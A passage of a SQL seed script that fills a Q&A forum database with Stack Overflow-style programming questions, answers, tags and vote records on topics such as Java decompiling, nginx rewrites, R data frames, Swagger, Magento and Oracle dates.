    classes in the jar will be decompiled. If &lt;code&gt;-r&lt;/code&gt; is specified, this should
    be a directory.&lt;/p&gt;

&lt;p&gt;But I always get errors.I don&#x27;t understand the above syntax.&lt;/p&gt;

&lt;p&gt;Please explain this syntax&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python Krakatau\decompile.py [-nauto] [-path PATH] [-out OUT] [-r] [-skip]
target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;using a simple example.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (22, 1, 'How to decompile .class and jar file using Storyyeller/Krakatau');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (22, 22, 25, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (22, 25);
INSERT INTO tag (text) VALUES ('python-2.7');
INSERT INTO questiontag (question_id, tag_id) VALUES (22, 57);
INSERT INTO tag (text) VALUES ('decompiler');
INSERT INTO questiontag (question_id, tag_id) VALUES (22, 58);
INSERT INTO activity (post_id, user_id, action) VALUES (22, 25, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (22, 25, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (23, 50, '&lt;p&gt;what is replacement of source command of bash shell in sh shell.&lt;/p&gt;

&lt;p&gt;I was getting error while executing source in #!/bin/sh&lt;/p&gt;

&lt;p&gt;in #!/bin/bash it  is working good.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (23, 1, 'what is replacement of source command of bash shell in sh shell');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (23, 23, 50, 'Create');
INSERT INTO tag (text) VALUES ('bash');
INSERT INTO questiontag (question_id, tag_id) VALUES (23, 59);
INSERT INTO tag (text) VALUES ('shell');
INSERT INTO questiontag (question_id, tag_id) VALUES (23, 60);
INSERT INTO tag (text) VALUES ('sh');
INSERT INTO questiontag (question_id, tag_id) VALUES (23, 61);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (24, 46, '&lt;p&gt;I have a list &lt;code&gt;L&lt;/code&gt; of dataframes. The elements (dataframes) of &lt;code&gt;L&lt;/code&gt; are unnamed. Each element includes only one variable &lt;code&gt;Var&lt;/code&gt; (same for all elements) and one observation (unique across elements). The observations are lists of random &quot;numbers&quot;. An elements of &lt;code&gt;L&lt;/code&gt; can look like: &lt;code&gt;:&#x27;data.frame&#x27;: 1 obs. of 1 variable: $ Var: chr &quot;\&quot;4\&quot;, \&quot;32\&quot;, \&quot;25\&quot;, \&quot;4\&quot;, &quot;&lt;/code&gt;. And &lt;code&gt;is.atomic(L[[1]]$Var)&lt;/code&gt; returns &lt;code&gt;TRUE&lt;/code&gt;. I am looking for a way to convert &lt;code&gt;L&lt;/code&gt; into a list of unnamed numeric vectors. End result should be:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt; L
[[1]]
[1]  4 32  25 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Right now I have:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt; L
[[1]]
                   Var
1 &quot;4&quot;, &quot;32&quot;, &quot;25&quot;, &quot;4&quot;,
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have tried &lt;code&gt;as.numeric&lt;/code&gt; but keep getting the warning &lt;code&gt;NAs introduced by coercion&lt;/code&gt; and the result is not as expected. Obviously I am doing something wrong. Any help is appreciated!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;List Sample&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt; L
[[1]]
                    Var
1 &quot;4&quot;, &quot;32&quot;, &quot;25&quot;, &quot;4&quot;, 

[[2]]
                    Var
1 &quot;36&quot;, &quot;3&quot;, &quot;31&quot;, &quot;5&quot;, 

[[3]]
                    Var
1 &quot;33&quot;, &quot;12&quot;, &quot;28&quot;, &quot;12&quot;, 

[[4]]
                    Var
1 &quot;4&quot;, &quot;30&quot;, &quot;35&quot;, &quot;30&quot;, 

[[5]]
                    Var
1 &quot;9&quot;, &quot;7&quot;, &quot;30&quot;, &quot;35&quot;, 
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (24, 1, 'Convert list of dataframes to list of numeric vectors in R');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (24, 24, 46, 'Create');
INSERT INTO tag (text) VALUES ('r');
INSERT INTO questiontag (question_id, tag_id) VALUES (24, 62);
INSERT INTO tag (text) VALUES ('list');
INSERT INTO questiontag (question_id, tag_id) VALUES (24, 63);
INSERT INTO tag (text) VALUES ('vector');
INSERT INTO questiontag (question_id, tag_id) VALUES (24, 64);
INSERT INTO tag (text) VALUES ('dataframe');
INSERT INTO questiontag (question_id, tag_id) VALUES (24, 65);
INSERT INTO tag (text) VALUES ('numeric');
INSERT INTO questiontag (question_id, tag_id) VALUES (24, 66);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (25, 24, '&lt;p&gt;I am completly new to RESTful APIs in general and how to implement them in my project, so I apologize beforehand, when this question is hard to understand.
My project leader asked my co-worker and me to let our code speak with one another. He generates a GUI that shall display the information I generate in the backend. For this we were advised to use a RESTful API, where his code can ask questions to my code. Additionally we were told to look into swagger and spring to realize the communication.&lt;/p&gt;

&lt;p&gt;Our current workflow looks like this: My co-worker will design an API with the help of swagger (&lt;a href=&quot;http://editor.swagger.io/#!/&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://editor.swagger.io/#!/&lt;/a&gt;) including all the questions he would like to ask my backend. I then recieve the corresponding yaml and can use the same link to generate some server code. &lt;/p&gt;

&lt;p&gt;Now I can fill in the blanks to finalize the logic and he can access my backend. Everything is fine until here. But what happens if we get new Requirements? He then designs additional API stuff, but what about my part of the workflow? Do I have to download the generated stuff again and fill in the blanks completly new, even for the stuff that was already implemented? Or is there a way to update the previously generated code in a way, that all new required methods are added, but the old logic is untouched?&lt;/p&gt;

&lt;p&gt;Maybe the workflow we decided on is stupid and you would suggest another workflow?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (25, 1, 'Updating the ApiController with Swagger');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (25, 25, 24, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (25, 25);
INSERT INTO tag (text) VALUES ('spring');
INSERT INTO questiontag (question_id, tag_id) VALUES (25, 67);
INSERT INTO tag (text) VALUES ('swagger');
INSERT INTO questiontag (question_id, tag_id) VALUES (25, 68);
INSERT INTO tag (text) VALUES ('swagger-editor');
INSERT INTO questiontag (question_id, tag_id) VALUES (25, 69);
INSERT INTO tag (text) VALUES ('swagger-codegen');
INSERT INTO questiontag (question_id, tag_id) VALUES (25, 70);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (26, 15, '&lt;p&gt;Below you see the part of my server which works brilliant, but now i have to &quot;simulate&quot; a php file which does not exists.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;location ~ \.php$
{ 
 fastcgi_pass php;
 include fastcgi.conf;
}

try_files $uri $uri/ /index.php?$uri&amp;amp;$args;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All my urls are currently rewritten du the try_files setting to my index.php, but not if i try to access domain.tld/something.php.&lt;/p&gt;

&lt;p&gt;How can i make those location block/s make domain.tld/something**.php** to use my try_files and send it to index.php?&lt;/p&gt;

&lt;p&gt;Thanks in advance.&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (26, 1, 'Nginx: HowTo rewrite nonx-existing .php file to index.php?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (26, 26, 15, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (26, 48);
INSERT INTO tag (text) VALUES ('nginx');
INSERT INTO questiontag (question_id, tag_id) VALUES (26, 71);
INSERT INTO tag (text) VALUES ('url-rewriting');
INSERT INTO questiontag (question_id, tag_id) VALUES (26, 72);
INSERT INTO tag (text) VALUES ('location');
INSERT INTO questiontag (question_id, tag_id) VALUES (26, 73);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (27, 43, '&lt;p&gt;I am checking this post: &lt;a href=&quot;http://stackoverflow.com/questions/23653951/r-ggplot2-how-do-i-specify-out-of-bounds-values-colour&quot;&gt;R ggplot2 - How do I specify out of bounds values&amp;#39; colour&lt;/a&gt; on how to &quot;Specifyy of out bounds values to color&quot;. &lt;/p&gt;

&lt;p&gt;The answer given was using &lt;code&gt;obs=squish&lt;/code&gt;, but that doesn&#x27;t let you specify a color that is out of range. In my example, it just uses the closest color in my range of values. What if I want to highlight those with another one?&lt;/p&gt;

&lt;p&gt;Example, here all the values out of range are treated as NA and are coloured as grey&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dat &amp;lt;- matrix(rnorm(100, 3, 1), ncol=10)
dat.m &amp;lt;- melt(dat)
dat.m[c(1,5,10),3] &amp;lt;- NA 

ggplot(dat.m, aes(X1, X2)) +
  geom_tile(aes(fill = value)) + 
  geom_text(aes(label = round(value, 1))) +
  scale_fill_continuous(&quot;&quot;,limits=c(1,2), low = &quot;#d73027&quot;,
                        high = &quot;#4575b4&quot;, na.value = &quot;grey&quot;) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If I use &lt;code&gt;oob=squish&lt;/code&gt;, it just colors them to the closest value, but where can I specify a color?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ggplot(dat.m, aes(X1, X2)) +
  geom_tile(aes(fill = value)) + 
  geom_text(aes(label = round(value, 1))) +
  scale_fill_continuous(&quot;&quot;,limits=c(1,2), low = &quot;#d73027&quot;,
                        high = &quot;#4575b4&quot;, na.value = &quot;grey&quot;,oob=squish) 
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (27, 1, 'Using oob to change value to a another color in ggplot2');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (27, 27, 43, 'Create');
INSERT INTO questiontag (question_id, tag_id) VALUES (27, 62);
INSERT INTO tag (text) VALUES ('ggplot2');
INSERT INTO questiontag (question_id, tag_id) VALUES (27, 74);
INSERT INTO tag (text) VALUES ('colors');
INSERT INTO questiontag (question_id, tag_id) VALUES (27, 75);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (28, 3, '&lt;p&gt;I am currently working on a learning method in order to select the best Cv for a job. I use tensorflow which seems to be efficient. But I have no data set (a list of annoted Cvs and a list of jobs with the best Cv from the data set). Do you think this kind of stuff is available ? &lt;/p&gt;

&lt;p&gt;Thanks for the help :) &lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (28, 1, 'CVs Job matching : neural network experiment');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (28, 28, 3, 'Create');
INSERT INTO tag (text) VALUES ('tensorflow');
INSERT INTO questiontag (question_id, tag_id) VALUES (28, 76);
INSERT INTO tag (text) VALUES ('neural-network');
INSERT INTO questiontag (question_id, tag_id) VALUES (28, 77);
INSERT INTO tag (text) VALUES ('dataset');
INSERT INTO questiontag (question_id, tag_id) VALUES (28, 78);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (29, 40, '&lt;p&gt;I&#x27;m looking for solution for my problem. I have category list with add to cart button and quantity box. I need to disable add to cart when is in quantity box 0 and allow it when is 1 and more. 
I need default value 0. 
Now, when I click to add to cart button is added one product to the cart. &lt;/p&gt;

&lt;p&gt;This problem is just in category list, not on product page. &lt;/p&gt;

&lt;p&gt;My code from /app/design/frontend/theme/theme/template/catalog/product/list.phtml&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php  if ( !($product-&amp;gt;getTypeInstance(true)-&amp;gt;hasOptions($product)/*$_product-&amp;gt;getData(&#x27;has_options&#x27;)*/ || $product-&amp;gt;isGrouped()) ) :  ?&amp;gt;

                                &amp;lt;div class=&quot;qty-holder&quot;&amp;gt;
                                    &amp;lt;input type=&quot;text&quot; name=&quot;qty&quot; id=&quot;qty_&amp;lt;?php echo $_product-&amp;gt;getId(); ?&amp;gt;&quot; maxlength=&quot;12&quot; value=&quot;&amp;lt;?php echo $product-&amp;gt;getProductDefaultQty() * 1 ?&amp;gt;&quot; title=&quot;&amp;lt;?php echo $this-&amp;gt;__(&#x27;Qty&#x27;) ?&amp;gt;&quot; class=&quot;input-text qty&quot; /&amp;gt;
                                    &amp;lt;div class=&quot;qty-changer&quot;&amp;gt;
                                        &amp;lt;a href=&quot;javascript:void(0)&quot; class=&quot;qty_inc&quot; style=&quot;height:34px; line-height:34px;&quot;&amp;gt;&amp;lt;i class=&quot;icon-up-dir&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;
                                        &amp;lt;a href=&quot;javascript:void(0)&quot; class=&quot;qty_dec&quot; style=&quot;height:34px; line-height:34px;&quot;&amp;gt;&amp;lt;i class=&quot;icon-down-dir&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;
                                    &amp;lt;/div&amp;gt;
                                &amp;lt;/div&amp;gt;
                            &amp;lt;/form&amp;gt;
                            &amp;lt;?php $_productid == $_product-&amp;gt;getId(); ?&amp;gt;

                            &amp;lt;a href=&quot;&amp;lt;?php if(!Mage::getStoreConfig(&quot;ajaxcart/addtocart/enablecategory&quot;, $code) &amp;amp;&amp;amp; !Mage::getStoreConfig(&quot;porto_settings/category/qty_field&quot;, $code)): ?&amp;gt;&amp;lt;?php echo $this-&amp;gt;getAddToCartUrl($_product) ?&amp;gt;&amp;lt;?php else: ?&amp;gt;javascript:void(0)&amp;lt;?php endif; ?&amp;gt;&quot; class=&quot;addtocart&quot; title=&quot;&amp;lt;?php echo $this-&amp;gt;__(&#x27;Add to Cart&#x27;) ?&amp;gt;&quot; &amp;lt;?php if(Mage::getStoreConfig(&quot;ajaxcart/addtocart/enablecategory&quot;, $code)):?&amp;gt;onclick=&quot;setLocationAjax(this,&#x27;&amp;lt;?php echo $this-&amp;gt;getAddToCartUrl($_product) ?&amp;gt;&#x27;,&#x27;&amp;lt;?php echo $_product-&amp;gt;getId(); ?&amp;gt;&#x27;)&quot;&amp;lt;?php elseif(Mage::getStoreConfig(&quot;porto_settings/category/qty_field&quot;, $code)): ?&amp;gt;onclick=&quot;document.getElementById(&#x27;addtocart_form_&amp;lt;?php echo $_product-&amp;gt;getId(); ?&amp;gt;&#x27;).submit()&quot;&amp;lt;?php endif; ?&amp;gt;&amp;gt;&amp;lt;i class=&quot;icon-cart&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;span&amp;gt;&amp;amp;nbsp;&amp;lt;?php echo $this-&amp;gt;__(&#x27;Add to Cart&#x27;) ?&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;

                        &amp;lt;?php else : ?&amp;gt;
                            &amp;lt;a href=&quot;&amp;lt;?php if(Mage::getStoreConfig(&quot;ajaxcart/addtocart/enablecategory&quot;, $code)):?&amp;gt;javascript:showOptions(&#x27;&amp;lt;?php echo $_product-&amp;gt;getId()?&amp;gt;&#x27;)&amp;lt;?php else: ?&amp;gt;&amp;lt;?php echo $this-&amp;gt;getAddToCartUrl($_product) ?&amp;gt;&amp;lt;?php endif; ?&amp;gt;&quot; class=&quot;addtocart&quot; title=&quot;&amp;lt;?php echo $this-&amp;gt;__(&#x27;Add to Cart&#x27;) ?&amp;gt;&quot;&amp;gt;&amp;lt;i class=&quot;icon-cart&quot;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;span&amp;gt;&amp;amp;nbsp;&amp;lt;?php echo $this-&amp;gt;__(&#x27;Add to Cart&#x27;) ?&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;
                            &amp;lt;a href=&#x27;&amp;lt;?php echo $this-&amp;gt;getUrl(&#x27;ajaxcart/index/options&#x27;,array(&#x27;product_id&#x27;=&amp;gt;$_product-&amp;gt;getId()));?&amp;gt;&#x27; class=&#x27;fancybox&#x27; id=&#x27;fancybox&amp;lt;?php echo $_product-&amp;gt;getId()?&amp;gt;&#x27; style=&#x27;display:none&#x27;&amp;gt;Options&amp;lt;/a&amp;gt;
                        &amp;lt;?php endif;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Any ideas? &lt;/p&gt;

&lt;p&gt;Thanks!&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (29, 1, 'Disable add to cart if in quantity box is 0');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (29, 29, 40, 'Create');
INSERT INTO tag (text) VALUES ('magento');
INSERT INTO questiontag (question_id, tag_id) VALUES (29, 79);
INSERT INTO tag (text) VALUES ('magento-1.9');
INSERT INTO questiontag (question_id, tag_id) VALUES (29, 80);

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 8, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (30, 48, '&lt;p&gt;Users of my app should be able to upload files such as images. Where, in what folder, should I save those files? I&#x27;m not that familiar with deploying Elixir/Phoenix applications, but I want not to include those files into the output, packed file(s) that are generated when I&#x27;m deploying my application. In other words, I don&#x27;t want to somehow statically embed uploaded images and files into my application. So where should I store them?&lt;/p&gt;
');
INSERT INTO question (post_id, topic_id, title) VALUES (30, 1, 'Where should I store user-uploaded files and images in Phoenix/Elixir?');
INSERT INTO activity (post_content_id, post_id, user_id, action) VALUES (30, 30, 48, 'Create');
INSERT INTO tag (text) VALUES ('elixir');
INSERT INTO questiontag (question_id, tag_id) VALUES (30, 81);
INSERT INTO tag (text) VALUES ('phoenix-framework');
INSERT INTO questiontag (question_id, tag_id) VALUES (30, 82);
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (30, 48, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (31, 1, '&lt;p&gt;(N.B. This answer is more to give more clarity to the other answers but it&#x27;s too long for a comment.)&lt;/p&gt;

&lt;p&gt;Oracle stores DATEs (and TIMESTAMPs etc) in its own specific format. Us humans represent dates in a variety of different formats and we deal with strings. Even us humans can get confused over what a date string - e.g. 03/09/2017 - is that the 3rd of September, 2017 or the 9th of March 2017?&lt;/p&gt;

&lt;p&gt;So, when you pass a date into Oracle, you need to convert it into Oracle&#x27;s date format by passing a string in and telling Oracle what the date format of that string is. This can be done using &lt;code&gt;to_date()&lt;/code&gt; or via the &lt;code&gt;DATE&lt;/code&gt; literal (which is always in &lt;code&gt;yyyy-mm-dd&lt;/code&gt; format).&lt;/p&gt;

&lt;p&gt;Conversely, when you want to read something that&#x27;s stored in Oracle&#x27;s DATE datatype, you need to tell Oracle how you want it to be displayed, which you can do by using &lt;code&gt;to_char()&lt;/code&gt; with the appropriate format mask.&lt;/p&gt;

&lt;p&gt;If you fail to explicitly convert the string-to-a-date or date-to-a-string, then Oracle uses the format specified in the NLS_DATE_FORMAT to decide how to do the conversion.&lt;/p&gt;

&lt;p&gt;In your case, you didn&#x27;t specify how you wanted your date to be displayed, so it has to rely on what format your NLS_DATE_FORMAT parameter is, and clearly it&#x27;s different to the format you passed the date-string in as.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (31, 1, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (31, 1, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (32, 50, '&lt;p&gt;Use &lt;a href=&quot;https://msdn.microsoft.com/library/system.data.sqlclient.sqlbulkcopycolumnmapping(v=vs.110).aspx&quot; rel=&quot;nofollow noreferrer&quot;&gt;SqlBulkCopy.ColumnMapping&lt;/a&gt; like this&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;for (int i = 0; i &amp;lt; dr.FieldCount; i++) {
    bulkcopy.ColumnMappings.Add(i, i);
}
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (32, 2, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (32, 50, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (33, 37, '&lt;p&gt;When I tried&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Columns(&quot;AQ:DC,DR:GD,GS:JE&quot;).Hidden = True
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I get an error (Type mismatch), so try to split the hide commands like this: &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Columns(&quot;AQ:DC&quot;).Hidden = True
Columns(&quot;DR:GD&quot;).Hidden = True
Columns(&quot;GS:JE&quot;).Hidden = True
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (33, 5, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (33, 37, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (34, 11, '&lt;p&gt;Ping the database ip if it is listening then confirm your system hostname , that it must be same as in your tnsname.ora file.
After that conenction depends on the following highlighted areas that must be correct entered.&lt;a href=&quot;https://i.stack.imgur.com/qV6r1.png&quot; rel=&quot;nofollow noreferrer&quot;&gt;enter image description here&lt;/a&gt; &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (34, 6, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (34, 11, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (35, 32, '&lt;p&gt;My understanding is, only the foreground window get the focus and can handle keyboard input to play. Not sure in make sense to send input to background window or not....&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (35, 8, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (35, 32, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (36, 1, '&lt;p&gt;You can try out something like this    &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class SomeClass{

    public static void main(String[] args){
        Double b[][]  = new Double [4][4];

        for(int i=0; i&amp;lt;b.length; i++ ){
                    for(int j=0;j&amp;lt;b[i].length;j++){
                     b[i][j]=(Math.random()*10);
                     if(b[i][j] &amp;lt; 5){
                        System.out.println(&quot;\n[i][j] = &quot;+&quot;[&quot;+i+&quot;][&quot;+j+&quot;]\t result = &quot;+b[i][j]);
                     }
                }
                }

    }

}
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (36, 9, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (36, 1, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', -2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (37, 36, '&lt;p&gt;Use the class selector named &quot;row&quot; that you have given to your ul element as such:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ul.row li 
{
.... your style goes here....
}
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (37, 11, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (37, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (38, 33, '&lt;p&gt;This works for me&lt;/p&gt;

&lt;p&gt;PAGE 1 XAML&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&amp;gt;
&amp;lt;ContentPage xmlns=&quot;http://xamarin.com/schemas/2014/forms&quot;
             xmlns:x=&quot;http://schemas.microsoft.com/winfx/2009/xaml&quot;
             x:Class=&quot;TestRelativeLayout.MyPage1&quot;
             Title=&quot;TabbedPage&quot;&amp;gt;
             &amp;lt;StackLayout&amp;gt;
                &amp;lt;Button Clicked=&quot;Handle_Clicked&quot; Text = &quot;Press&quot;&amp;gt;

        &amp;lt;/Button&amp;gt;
    &amp;lt;/StackLayout&amp;gt;
&amp;lt;/ContentPage&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PAGE 1 XAML.CS&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;using Xamarin.Forms;

namespace TestRelativeLayout
{
    public partial class MyPage1 : ContentPage
    {
        public MyPage1()
        {
            InitializeComponent();
        }

        public void Handle_Clicked(object sender, System.EventArgs e)
        {
            Application.Current.MainPage = new NavigationPage(new MyPage2());
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Try to remove&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;private async Task
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and use&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;void

private async Task SecondView_Click()
        {
            App.Current.MainPage = new NavigationPage(new SecondView());
        }
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (38, 14, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (38, 33, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (39, 5, '&lt;ol&gt;
&lt;li&gt;&lt;p&gt;set a variable in service class  to check service is running or not.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;let boolRuningService is a variable&lt;/p&gt;

&lt;p&gt;Intent intent = new Intent(DashboardScreen.this, ServiceClass.class);
            PendingIntent pintent = PendingIntent.getService(DashboardScreen.this, 0, intent, 0);&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;            if(!boolRuningService){
                   AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
                alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), 30*1000, pintent);
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (39, 15, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (39, 5, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (40, 33, '&lt;p&gt;Always avoid using nested maps.&lt;/p&gt;

&lt;p&gt;AVRO file format is schema based. If you use nested map it will become difficult to design a schema. Also avro works based on serialisation technique. If you are going to work with &quot;String&quot; it will work fine but not with the case of other data types.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (40, 16, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (40, 33, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (41, 36, '&lt;p&gt;Please check this : &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
$response = &#x27;{&quot;metafields&quot;:[{&quot;id&quot;:30007223558,&quot;namespace&quot;:&quot;global&quot;}, {&quot;id&quot;:454872458451,&quot;namespace&quot;:&quot;local&quot;}, {&quot;id&quot;:154644565,&quot;namespace&quot;:&quot;global&quot;}]}&#x27;;

$response = json_decode($response); 
foreach($response-&amp;gt;metafields as $val){
    echo $val-&amp;gt;id.&quot;=&quot;.$val-&amp;gt;namespace.&quot;&amp;lt;br /&amp;gt;&quot;;
}?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (41, 18, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (41, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (42, 46, '&lt;p&gt;A simple way is to use the &lt;code&gt;reduce&lt;/code&gt; method:&lt;/p&gt;

&lt;p&gt;Something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;var total = arr.reduce(function(t, v) {
    return t += Number(v.value);
}, 0);
&lt;/code&gt;&lt;/pre&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (42, 21, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (42, 46, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (43, 36, '&lt;p&gt;Your strings need separating and stripping of quotation marks, by the look of it. They might also be factors. Try something like this...&lt;/p&gt;

